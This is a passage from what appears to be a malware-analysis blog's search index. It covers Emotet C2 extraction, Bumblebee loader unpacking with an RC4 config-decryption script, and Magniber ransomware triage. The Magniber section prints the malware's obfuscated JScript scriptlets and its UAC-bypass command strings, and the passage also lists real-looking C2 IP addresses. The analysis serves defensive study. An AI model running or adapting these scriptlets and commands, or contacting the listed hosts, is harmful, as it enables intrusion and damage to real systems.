0x7ffa3ba23bd0: 213.241.20.155:443 0x7ffa3ba3519c: 103.43.46.182:443 0x7ffa3ba2b610: 0.0.0.0:0 0x7ffa3ba4c8b0: 129.232.188.93:443 0x7ffa3ba3c9f8: 103.132.242.26:8080 0x7ffa3ba36a10: 151.106.112.196:8080 0x7ffa3ba4339c: 45.118.115.99:8080 0x7ffa3ba21f58: 185.4.135.165:8080 0x7ffa3ba4557c: 103.70.28.102:8080 0x7ffa3ba28bc8: 51.91.7.5:8080 0x7ffa3ba3c5b4: 27.54.89.58:8080 0x7ffa3ba21000: 206.189.28.199:8080 0x7ffa3ba2fbc4: 79.137.35.198:8080 0x7ffa3ba33278: 51.254.140.238:7080 0x7ffa3ba468c0: 173.212.193.249:8080 0x7ffa3ba464fc: 203.114.109.124:443 0x7ffa3ba28ee0: 94.23.45.86:4143 0x7ffa3ba3092c: 189.126.111.200:7080 0x7ffa3ba24d58: 160.16.142.56:8080 0x7ffa3ba3e274: 102.222.215.74:443 0x7ffa3ba2bcf8: 5.9.116.246:8080 0x7ffa3ba4a340: 167.172.253.162:8080 0x7ffa3ba29820: 82.165.152.127:8080 0x7ffa3ba494d8: 197.242.150.244:8080 0x7ffa3ba35c7c: 72.15.201.15:8080 0x7ffa3ba3d5c8: 101.50.0.91:8080 0x7ffa3ba21d48: 51.91.76.89:8080 0x7ffa3ba4103c: 183.111.227.137:8080 0x7ffa3ba28dcc: 188.44.20.25:443 0x7ffa3ba22f64: 58.227.42.236:80 0x7ffa3ba301bc: 45.176.232.124:443 0x7ffa3ba2b9e4: 163.44.196.120:8080 0x7ffa3ba24c38: 159.65.88.10:8080 0x7ffa3ba3cf80: 146.59.226.45:443 0x7ffa3ba3e360: 1.234.2.232:8080 0x7ffa3ba49c14: 209.97.163.214:443 0x7ffa3ba469d0: 46.55.222.11:443 0x7ffa3ba2dc28: 103.75.201.2:443 0x7ffa3ba26f38: 216.158.226.206:443 0x7ffa3ba45678: 134.122.66.193:8080 0x7ffa3ba24868: 1.234.21.73:7080 0x7ffa3ba35598: 167.99.115.35:8080 .",
            "url": "https://research.openanalysis.net/emotet/emulation/config/dumpulator/malware/2022/05/19/emotet_x64_emulation.html",
            "relUrl": "/emotet/emulation/config/dumpulator/malware/2022/05/19/emotet_x64_emulation.html",
            "date": " ‚Ä¢ May 19, 2022"
        }
        
    
  
    
        ,"post49": {
            "title": "Bumblebee Loader",
            "content": "Overview . According to Google&#39;s Threat Analysis Group... . The loader can be recognized by its use of a unique user-agent ‚Äúbumblebee‚Äù which both variants share. The malware, hence dubbed BUMBLEBEE. . This loader has been observed downloading payloads such as cobalt strike and is often delivered itself via an ISO file. The sample we are strating with today is an ISO. . References . The chronicles of Bumblebee:The Hook, the Bee, and the Trickbot connection- Malpedia | Exposing initial access broker with ties to Conti | lnk file parser | . Sample . 0d740a348362171814cb314a48d763e336407904a36fa278eaf390c5743ec33b . . Triage . The ISO contains two files desk.dll and New Folder.Lnk. We can right click properties on the lnk file to take a look at its command. The lnk file is used to launch the dll with the following command. . C: Windows System32 rundll32.exe desk.dll,aCmHmjrptS . Unpacking . load rundll32.exe in x64dbg and change the command line to pass desk.dll,#1 | enable break on dll load | once desk.dll is loaded locate export we want to debug (aCmHmjrptS ord 1) and add a hardware breakpoint | remove the break on dll load and run until the export is bp is hit | we initially tried watching for allocated memory via VirutalAllocEx but didn&#39;t see anything interesting | instead we eneabled break on exit and just ran the dll | when the break on exit was hit we searched memory for the PE header DOS string and located a mapped PE | we unmapped the PE to reveal the payload | . Payload . Unpacked and unmapped payload abaa83ab368cbd3bbdaf7dd844251da61a571974de9fd27f5dbaed945b7c38f6 available on malshare. . Build Artifacts . There is a build artifact that may be useful for hunting other samples. . Z: hooker2 Common md5.cpp . We searched for this on VirusTotal using the search term https://www.virustotal.com/gui/search/content%253A%257B5a003a005c0068006f006f006b006500720032005c00%257D/files and found other sample but nothing too interesting. . Anti-Analysis . There are many anti-analysis checks some of which have been directly copied from the open source project al-khaser. To get some free work we compiled al-khaser and created and IDB using a build version with symbols. We when used bindiff to match the al-khaser IDB with the payload. This allowed us to import all of the symbols from al-khaser. . IDA Filtering . While using BinDiff we ran into some issues with the IDA filter not working correcte (we were trying to filter out std and internal functions). To get the filter to work correctly we needed use a specific order shown below. . Config . Instead of a config the payload contains a series of encrypted strings in the .data section. These strings include the campaign name and a C2 list. The encryption is RC4 and the key is a hard-coded plaintext string (also in the .data section). In our sample the key was BLACK. . Decrypted Config String . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . def rc4crypt(data, key): #If the input is a string convert to byte arrays if type(data) == str: data = data.encode(&#39;utf-8&#39;) if type(key) == str: key = key.encode(&#39;utf-8&#39;) x = 0 box = list(range(256)) for i in range(256): x = (x + box[i] + key[i % len(key)]) % 256 box[i], box[x] = box[x], box[i] x = 0 y = 0 out = [] for c in data: x = (x + 1) % 256 y = (y + box[x]) % 256 box[x], box[y] = box[y], box[x] out.append(c ^ box[(box[x] + box[y]) % 256]) return bytes(out) . data = b&#39; x47 xCB xD6 x45 x96 xAD x39 x36 x82 x64 xA3 x68 xBB x80 x5C x8F x4F x86 x35 x73 xFD xE9 x2E x6D x8C x70 xB2 xE5 xEE xD3 xC6 x11 x60 xA2 x12 x6A x84 xC3 x52 x7A x3C x75 x3F x26 x60 x58 xF2 x4F x5E x74 xBE xA9 xAF xEE x84 xC7 x85 x54 x13 x63 xC1 x70 xBF x40 xE5 xC7 x8F xF0 xBE xB5 xF0 xBA x61 x7C x53 xF6 x4B xB9 x19 x7B xE1 xA0 xD9 xB4 x59 xC3 x37 x0B x31 x93 xC3 x16 x95 x64 x5F xE1 x5F xDD x62 x89 xAA x39 x08 x8C x8E xDC xC1 x94 xB8 x4C x3F x96 x97 x05 x06 xC4 xA4 xCA xB6 x7A x96 x3A x84 x2B xFD x9B x26 x9A x3C x8A x17 x3C xF9 x9C xCA x43 x36 xBC x4D x54 x7B x91 x0D x05 xC7 x0E x7A x6B x97 x36 xD2 xDD x53 x4D xB1 xDD xCB xCF xC6 xF6 x3A xC8 x02 xF2 xCF x6C x4D xF2 xD4 x35 xB6 x58 x73 x9D xBE x48 xA0 xF8 x9D x5D x87 xB6 x37 x71 x7E xD6 x46 x81 xCD xC3 xAE x18 xD7 xB5 x2F x90 x0D x87 x6F x8E x1C x47 xBA xD5 x86 xD3 xB4 x5C x47 x7F x03 x13 x17 x22 x87 x0C xD9 x66 x69 x32 x8F x98 xD2 xB2 x9F xB7 x68 xEA x50 xB8 x42 xB7 x61 x8C xB1 xC0 xDD x62 xA2 x53 x98 xE3 x02 xB2 xDD x82 x0A xE3 xB7 x7F xB9 xA7 xDB xD1 x43 xD5 x17 xBC xC0 x70 xF5 xCA x9D x56 xD9 xF6 xDC xBD xB9 xF0 x2B x7A xC9 x23 xA8 x71 xC6 xB3 x16 x74 x3F xB3 xFE xAF xE1 x2F x1E xCD x6F x22 x54 xB4 x18 xB0 xA8 x7E x34 xE3 x83 x43 x37 xB9 xB7 xA4 x39 x4A xE2 xFC xDB xE0 xF5 xDD xD6 x19 xAE x6C xBE x1E x1D x98 x17 xDF xA6 xB1 x2E xED xCA x03 x05 xBB x9F x5B x3B x8F x83 x48 x20 x33 x2E x50 xCE x2F x9E x7E xA5 xAE x86 x77 xFB x39 xB4 x35 x6D xBA xB8 xC9 x0A x82 x60 x80 x4C xA2 xBD x60 x2B x19 x9E x8D xBC xB2 x37 xCF xFD x6C xFB x54 x7A xD6 xB4 xA0 x07 x4F x6C xE4 x27 xFF xBA xE3 x5F x36 xA7 x41 xA9 x98 x88 x0F xDD xFB xA0 xF6 x93 xF6 x88 xED xCC xB2 x74 x73 x3B xCF x4A x79 x80 x6D xD3 x59 x27 x37 x73 x0D xBD x61 xE3 xDF x50 x33 x15 xAB x2A xAA x6E x8C x39 x25 x71 x78 xA5 x46 xB7 xB8 xE1 x16 xAD xE0 x24 x8D x91 xDD xA1 xC0 xE5 xE3 xB2 xB3 x62 x69 x82 x44 xE1 x64 x78 x0F x8A x75 x65 x46 x75 x89 x36 x8A x4A x43 xE0 x1B x02 x19 x71 x64 x8F x2F xD5 xF8 xA9 xAC x84 x37 x49 xDD x7D x24 x43 x17 xC1 xC1 x1F xD8 xD7 xD3 x07 xEF x22 x51 xB2 x75 x02 xF7 x10 x3F xC5 xFB x9F x5E x82 xA8 x23 xE9 x9A x17 x42 xFE x79 xC7 x69 x3E x6B x38 x05 x05 x2F x01 xED x50 xD7 x01 x18 x6B x38 x76 x2A x79 xDC x9F x12 x34 xE5 x26 x47 xBA x23 x73 xA1 xEB x82 x2A x3F xFD xD6 x90 xB6 x6B xD0 xB5 xEC xA4 x54 xBB xAD xBB xF2 xF0 x10 x42 xDA xAB x92 x75 x97 x27 xB7 x9D x7C xCF xCE xE2 x82 xB0 x49 x55 x87 x83 x69 x6F x90 xFF x4F x3F xF1 x6B x39 xE6 x45 xD9 x83 xBB xDE x0D xA0 x62 x0D x32 xD5 x24 x41 x8F x28 xCC xB4 x60 x95 x23 x1F x01 xD7 xB6 x08 x26 xC9 x02 x4B xFE xFF x20 xFF x2F xC7 xEB x00 x87 x10 x28 x24 x02 x92 xE4 xDA x2E x9D x4D xFC xB0 x96 xAD x00 x19 x72 x07 xEE x00 xD2 x4A x66 xAC xFB x06 xE4 x8E x62 x70 xA0 xDD x12 x64 x93 x67 x34 xBB xDF x0A x16 x6B xDE xC3 x1F x36 x47 x8B xC4 xCF x7B xAA x69 x1F x1C x61 x54 xE2 xA8 x17 xDA x4D xFA x42 x42 x3C xF7 x9A x4A xD3 x17 x2B xFC x8A x65 x73 x2F xBC x9F x34 x6D xBF x20 xFF x6A xF1 x75 x90 x1B x1E x04 x6A xC2 x2C x27 x81 xB6 x5A xC4 x16 xE7 xFD x2C xED xD0 x51 x52 x3A xEA x0A x9D xDB x4D xED x94 x63 x86 x32 x71 x02 x21 xF6 x1C xB5 x16 x06 xA5 xE5 x2A xAA xF7 x35 xA9 xED x4A x59 x1D x50 xDE xC7 xC4 x31 x6C x4D x3A x76 x13 xA5 xA9 xC6 xEA x14 x1E x7D x62 xC3 x32 xDA xFE x0C x5E x7E xA9 xB9 x12 x81 xA0 xDA xD8 xE7 x5C x0C x26 x1E x27 x22 xC6 x05 x0E xD2 x19 x60 xC7 x9E x27 x44 xAC xE4 xCD x8B x6E x1E x1B xD3 xED x7A xEF x6E x2C x8E x3A xFA x40 x59 x56 x10 xA7 xE3 x9E x9A x54 xC3 x29 xC9 xCA xCB xA2 x40 x96 xA6 x7A x0C xFD x21 x86 xEE x3C xFD x5D xB3 x97 x89 x06 x36 xEB x18 xF2 x39 x7F x60 xF7 x97 x03 x3A xBB x6B x81 x3A xE1 x70 x72 x33 x1C xF2 xA9 x74 xF2 x04 xC2 xB2 xD8 x54 x88 x8C xFA x6F xD6 x45 xAC xFB xC6 xB9 xD9 xE1 x59 x10 xD6 x7F x5F x12 x3A x8B x52 x8B x24 xEF x10 x8E x23 x13 xB5 x19 xA4 x4E x1E x6B xD3 x0B x5D x43 x98 x90 x88 xF8 x3B x56 x84 x31 xB1 xF7 x76 x57 x35 x25 x14 xF9 x26 x95 xC5 x4B xF0 xB8 xDF x27 x8C xB2 x11 x60 xBE x0D xC3 x7B x96 x95 x6D x0D x88 x3A x3E x18 xA3 xE4 xD4 x60 x89 x93 xAC x59 x6D x85 x78 xB6 x14 xF3 xD5 x05 x9F x40 x2F xD0 xAB xBE xC4 x09 x6D xAE x1E xE2 x6E x3E x99 x07 x98 xDD x03 x2D xC2 xDB x10 x35 x83 xB7 x27 x17 x71 xE6&#39; key = &#39;BLACK&#39; out = rc4crypt(data, key) print(out) . b&#39;142.11.222.79:443,23.254.224.200:443,103.175.16.52:443,199.195.252.30:443 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; . data1 = &#39;47CED45EC69C1704B0568D5F82BA68BB7CAA0740D3DB1B59A24280D1C0E1F6215A962659A8F26249124408134E69C4616B46849D9BDDA8F6BC6D3D52F8459172D0F5A1C38E8FC48E527C53F64BB9197B&#39; out = rc4crypt(unhex(data1), key) print(out) . b&#39;1105a x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; . data1 = &#39;42CBD06BA79C1704B0568D5F82BA68BB7CAA0740D3DB1B59A24280D1C0E1F6215A962659A8F26249124408134E69C4616B46849D9BDDA8F6BC6D3D52F8459172D0F5A1C38E8FC48E527C53F64BB9197B&#39; out = rc4crypt(unhex(data1), key) print(out) . b&#39;444 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; .",
            "url": "https://research.openanalysis.net/bumblebee/malware/loader/unpacking/2022/05/12/bumblebee_loader.html",
            "relUrl": "/bumblebee/malware/loader/unpacking/2022/05/12/bumblebee_loader.html",
            "date": " ‚Ä¢ May 12, 2022"
        }
        
    
  
    
        ,"post50": {
            "title": "Magniber Ransomware Triage",
            "content": "Overview . We will be taking a look at Magniber ransomware. This ransomware is unique in that it uses syscalls instead of APIs and injects its main payload instead of unpacking to a nice PE. . . Sample . Magniber Packed (Malshare) | . References . Threat Analysis Report: PrintNightmare and Magniber Ransomware | What is a syscall | Extracting syscall numbers from ntdll (with code) | . Reversing Notes . Dumping . The sample injects its main payload into RWX memory but since it uses syscalls we can&#39;t use our x64dbg trick of monitoring memory writes to track the injected memory. Instead we just run the sample then use processhacker to suspend the process and inpsect the memory. . c: Windows System32 rundll32.exe magnibar.bin,#1 . We can see there are a lot of 4kB RWX segments but when we inspect them there is only a few bytes of code. However there is also a larger 52kB segment that contains what looks like code and some strings. We can dump this for further static analysis. . . Strings . The following strings are injected along with the payload. . regsvr32.exe scrobj.dll /s /u /n /i:../../../Users/Public/gxv495p91vs cmd /c &quot;start fodhelper.exe&quot; cmd /c &quot;start compmgmtlauncher.exe&quot; ?? 0123456789abcdef f0123456789 egoxsjzcj j BaseNamedObjects yv6493 Microsoft Enhanced RSA and AES Cryptographic Provider documents and settings appdata local settings sample music sample pictures sample videos tor browser recycle windows boot intel msocache perflogs program files programdata recovery system volume information winnt README.html . Payload Static Analysis . Once we open the dumped payload in IDA we can see that it relies on syscalls. . . In order to resolve these sycalls we need to create an enum mapping the syscall number to the API name. We can use our own sycall enum script for this task. Once we import the enum into IDA we can resolve the syscall numbers. . Since syscall numbers depend on the Windows build there is some logic in the malware that is used to check the KUSER_SHARED_DATA for the NtBuildNumber and NtMajorVersion. These manifest as refernces to memory at 0x7FFE0260 and 0x7FFE026C. IDA isn&#39;t able to resolve this and since our syscalls will be specific to windows version that we pulled our ntdll from we can artificailly set these values in IDA. . Edit-&gt;Segments-&gt;Creat segement... | Set the segment start address to 0x7FFE0260 and the length to atleast include 0x7FFE026C + 4 | Open Segments window and right click edit the new segment and change the Segment permissions to Read only | Edit the segment bytes to add the correct build number and major version number | . Once you have done this you can decompile the function and IDA will automatically remove all of the non-relevant syscalls. . Automatically Fixing KUSER SHARED Refs in IDA . This code is from Thomas . def fix_kuser_shared_data(): &quot;&quot;&quot; Find all calls to KUserSharedData, create a corresponding segment, load Windows 10 type library, and import the definition to the database &quot;&quot;&quot; address = 0x7FFE0000 # create the segment AddSeg(address, address, 0, 1, 0, scPub) set_segm_name(address, &#39;KUserSharedData&#39;) set_segm_attr(address, SEGATTR_PERM, SEGPERM_READ | SEGPERM_WRITE) set_segm_attr(address, SEGATTR_ALIGN, saRelPara) # load windows 10 type library add_til(&#39;ntddk_win10&#39;, ADDTIL_DEFAULT) # import the definition to the database import_type(None, -1, &#39;_KUSER_SHARED_DATA&#39;, IMPTYPE_LOCAL) create_struct(address, -1, &quot;_KUSER_SHARED_DATA&quot;) . Embeded Script . &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;l06g2t&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var vk87t568 = new Array(111,106,114,108,104,32,46,112,79,105,118,101,99,83,87,97,110,116,82,113,119,65,100,109,47,115,98,68,117,88,120);for(var a7tvb=0;a7tvb&lt;31;a7tvb++) vk87t568[a7tvb] = String.fromCharCode(vk87t568[a7tvb]);var x9uvqw7 = new this[vk87t568[21]+vk87t568[12]+vk87t568[17]+vk87t568[9]+vk87t568[10]+vk87t568[11]+vk87t568[29]+vk87t568[8]+vk87t568[26]+vk87t568[1]+vk87t568[11]+vk87t568[12]+vk87t568[17]](vk87t568[14]+vk87t568[13]+vk87t568[12]+vk87t568[2]+vk87t568[9]+vk87t568[7]+vk87t568[17]+vk87t568[6]+vk87t568[13]+vk87t568[4]+vk87t568[11]+vk87t568[3]+vk87t568[3])[vk87t568[18]+vk87t568[28]+vk87t568[16]](vk87t568[10]+vk87t568[25]+vk87t568[25]+vk87t568[15]+vk87t568[22]+vk87t568[23]+vk87t568[9]+vk87t568[16]+vk87t568[6]+vk87t568[11]+vk87t568[30]+vk87t568[11]+vk87t568[5]+vk87t568[27]+vk87t568[11]+vk87t568[3]+vk87t568[11]+vk87t568[17]+vk87t568[11]+vk87t568[5]+vk87t568[13]+vk87t568[4]+vk87t568[15]+vk87t568[22]+vk87t568[0]+vk87t568[20]+vk87t568[25]+vk87t568[5]+vk87t568[24]+vk87t568[15]+vk87t568[3]+vk87t568[3]+vk87t568[5]+vk87t568[24]+vk87t568[19]+vk87t568[28]+vk87t568[9]+vk87t568[11]+vk87t568[17]);]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; &lt;?XML version=&quot;1.0&quot;?&gt;&lt;scriptlet&gt;&lt;registration progid=&quot;r6ys81u&quot;&gt;&lt;script language=&quot;JScript&quot;&gt;&lt;![CDATA[var ch4me00 = new Array(71,53,102,97,114,67,48,111,50,58,65,69,119,79,68,103,90,104,83,75,113,112,117,85,108,120,82,45,100,80,109,88,78,47,46,32,89,105,118,98,51,72,101,106,92,121,99,110,87,115,116,84,95);for(var a7n5f=0;a7n5f&lt;53;a7n5f++) ch4me00[a7n5f] = String.fromCharCode(ch4me00[a7n5f]);var h873tlc494 = new this[ch4me00[10]+ch4me00[46]+ch4me00[50]+ch4me00[37]+ch4me00[38]+ch4me00[42]+ch4me00[31]+ch4me00[13]+ch4me00[39]+ch4me00[43]+ch4me00[42]+ch4me00[46]+ch4me00[50]](ch4me00[48]+ch4me00[18]+ch4me00[46]+ch4me00[4]+ch4me00[37]+ch4me00[21]+ch4me00[50]+ch4me00[34]+ch4me00[18]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24])[ch4me00[26]+ch4me00[42]+ch4me00[15]+ch4me00[48]+ch4me00[4]+ch4me00[37]+ch4me00[50]+ch4me00[42]](ch4me00[41]+ch4me00[19]+ch4me00[11]+ch4me00[36]+ch4me00[52]+ch4me00[5]+ch4me00[23]+ch4me00[26]+ch4me00[26]+ch4me00[11]+ch4me00[32]+ch4me00[51]+ch4me00[52]+ch4me00[23]+ch4me00[18]+ch4me00[11]+ch4me00[26]+ch4me00[44]+ch4me00[18]+ch4me00[7]+ch4me00[2]+ch4me00[50]+ch4me00[12]+ch4me00[3]+ch4me00[4]+ch4me00[42]+ch4me00[44]+ch4me00[5]+ch4me00[24]+ch4me00[3]+ch4me00[49]+ch4me00[49]+ch4me00[42]+ch4me00[49]+ch4me00[44]+ch4me00[30]+ch4me00[49]+ch4me00[27]+ch4me00[49]+ch4me00[42]+ch4me00[50]+ch4me00[50]+ch4me00[37]+ch4me00[47]+ch4me00[15]+ch4me00[49]+ch4me00[44]+ch4me00[49]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24]+ch4me00[44]+ch4me00[7]+ch4me00[21]+ch4me00[42]+ch4me00[47]+ch4me00[44]+ch4me00[46]+ch4me00[7]+ch4me00[30]+ch4me00[30]+ch4me00[3]+ch4me00[47]+ch4me00[28]+ch4me00[44],ch4me00[4]+ch4me00[42]+ch4me00[15]+ch4me00[49]+ch4me00[38]+ch4me00[4]+ch4me00[40]+ch4me00[8]+ch4me00[34]+ch4me00[42]+ch4me00[25]+ch4me00[42]+ch4me00[35]+ch4me00[49]+ch4me00[46]+ch4me00[4]+ch4me00[7]+ch4me00[39]+ch4me00[43]+ch4me00[34]+ch4me00[28]+ch4me00[24]+ch4me00[24]+ch4me00[35]+ch4me00[33]+ch4me00[49]+ch4me00[35]+ch4me00[33]+ch4me00[22]+ch4me00[35]+ch4me00[33]+ch4me00[47]+ch4me00[35]+ch4me00[33]+ch4me00[37]+ch4me00[9]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[34]+ch4me00[34]+ch4me00[33]+ch4me00[23]+ch4me00[49]+ch4me00[42]+ch4me00[4]+ch4me00[49]+ch4me00[33]+ch4me00[29]+ch4me00[22]+ch4me00[39]+ch4me00[24]+ch4me00[37]+ch4me00[46]+ch4me00[33]+ch4me00[45]+ch4me00[20]+ch4me00[1]+ch4me00[45]+ch4me00[17]+ch4me00[6],ch4me00[26]+ch4me00[11]+ch4me00[0]+ch4me00[52]+ch4me00[18]+ch4me00[16]);var h873tlc494 = new this[ch4me00[10]+ch4me00[46]+ch4me00[50]+ch4me00[37]+ch4me00[38]+ch4me00[42]+ch4me00[31]+ch4me00[13]+ch4me00[39]+ch4me00[43]+ch4me00[42]+ch4me00[46]+ch4me00[50]](ch4me00[48]+ch4me00[18]+ch4me00[46]+ch4me00[4]+ch4me00[37]+ch4me00[21]+ch4me00[50]+ch4me00[34]+ch4me00[18]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24])[ch4me00[26]+ch4me00[42]+ch4me00[15]+ch4me00[48]+ch4me00[4]+ch4me00[37]+ch4me00[50]+ch4me00[42]](ch4me00[41]+ch4me00[19]+ch4me00[11]+ch4me00[36]+ch4me00[52]+ch4me00[5]+ch4me00[23]+ch4me00[26]+ch4me00[26]+ch4me00[11]+ch4me00[32]+ch4me00[51]+ch4me00[52]+ch4me00[23]+ch4me00[18]+ch4me00[11]+ch4me00[26]+ch4me00[44]+ch4me00[18]+ch4me00[7]+ch4me00[2]+ch4me00[50]+ch4me00[12]+ch4me00[3]+ch4me00[4]+ch4me00[42]+ch4me00[44]+ch4me00[5]+ch4me00[24]+ch4me00[3]+ch4me00[49]+ch4me00[49]+ch4me00[42]+ch4me00[49]+ch4me00[44]+ch4me00[30]+ch4me00[49]+ch4me00[27]+ch4me00[49]+ch4me00[42]+ch4me00[50]+ch4me00[50]+ch4me00[37]+ch4me00[47]+ch4me00[15]+ch4me00[49]+ch4me00[44]+ch4me00[49]+ch4me00[17]+ch4me00[42]+ch4me00[24]+ch4me00[24]+ch4me00[44]+ch4me00[7]+ch4me00[21]+ch4me00[42]+ch4me00[47]+ch4me00[44]+ch4me00[46]+ch4me00[7]+ch4me00[30]+ch4me00[30]+ch4me00[3]+ch4me00[47]+ch4me00[28]+ch4me00[44]+ch4me00[14]+ch4me00[42]+ch4me00[24]+ch4me00[42]+ch4me00[15]+ch4me00[3]+ch4me00[50]+ch4me00[42]+ch4me00[11]+ch4me00[25]+ch4me00[42]+ch4me00[46]+ch4me00[22]+ch4me00[50]+ch4me00[42], &quot;&quot;, 